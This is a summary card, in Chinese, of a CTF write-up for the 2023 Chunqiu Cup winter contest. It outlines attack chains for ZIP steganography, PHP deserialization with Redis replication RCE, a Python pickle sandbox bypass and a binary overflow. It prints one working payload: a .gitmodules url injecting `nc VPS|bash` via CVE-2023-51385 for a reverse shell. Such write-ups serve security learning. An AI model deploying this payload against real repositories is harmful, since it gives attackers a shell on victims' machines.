---
title: "2023 年春秋杯网络安全联赛冬季赛 Writeup"
category: web
tags: ["春秋杯冬季赛 2023", "web", "外卖ZIP名隐写", "明文爆破", "PHP混淆还原", "CVE-2023-51385_OpenSSH_ProxyCommand"]
signals: ["春秋杯冬季赛 2023 2023", "外卖ZIP名隐写", "明文爆破", "PHP混淆还原", "CVE-2023-51385_OpenSSH_ProxyCommand", "Redis主从复制", "dict协议", "Python格式化字符串漏洞", "沙盒bypass", "web_unknown", "ZIP", "OpenSSH", "ProxyCommand", "Redis"]
difficulty: hard
source: "https://www.ctfiot.com/158635.html"
tools: ["PHP", "Python", "netcat"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2023 年春秋杯网络安全联赛冬季赛 Writeup

> 赛事：春秋杯冬季赛 2023 2023 | 方向：web | 难度：hard | 工具：PHP、Python、netcat

## 一句话总结

春秋杯冬季赛综合：外卖 ZIP 隐写+明文爆破+OpenSSH ProxyCommand+Redis 主从复制+Python pickle 沙盒。

## 攻击链

1. 谁偷吃了我的外卖: foremost 分离图片 → 排序 ZIP 内 _ 后 4 字符 → base64 → 补 PK 文件头 → 明文爆破
2. 明文混淆: LICENSE.txt 明文爆破 + PHP urldecode/eval 混淆还原
3. modules: CVE-2023-51385 OpenSSH ProxyCommand 注入，.gitmodules url 字段 nc bash
4. ezezez_php: PHP 反序列化 POP 链 + Redis 主从复制 + dict:// 协议 RCE
5. 构造 Er__set → $value($this->Flag) 调用系统函数
6. picup: Python 格式化字符串漏洞 + pickle.loads 反序列化沙盒 bypass
7. 伪造 admin session + 上传 .pkl 文件
8. nmanager: 整数溢出 + 栈任意读写 + 泄露 libc 改 main 返回

## 关键 payload

```
CVE-2023-51385: .gitmodules url=ssh://`nc VPS 3333|bash|nc VPS 3334`foo
```

## 经验教训

CVE-2023-51385 走 .gitmodules 注入 nc|bash；Redis 主从复制 + dict:// 协议是 SSRF 经典 RCE；Python 格式化字符串漏洞可泄露 admin 密码。

## 标签

外卖ZIP名隐写、明文爆破、PHP混淆还原、CVE-2023-51385_OpenSSH_ProxyCommand、Redis主从复制、dict协议、Python格式化字符串漏洞、沙盒bypass

## 参考来源

- https://www.ctfiot.com/158635.html
- 原文件：2023年春秋杯网络安全联赛冬季赛Writeup.full.md
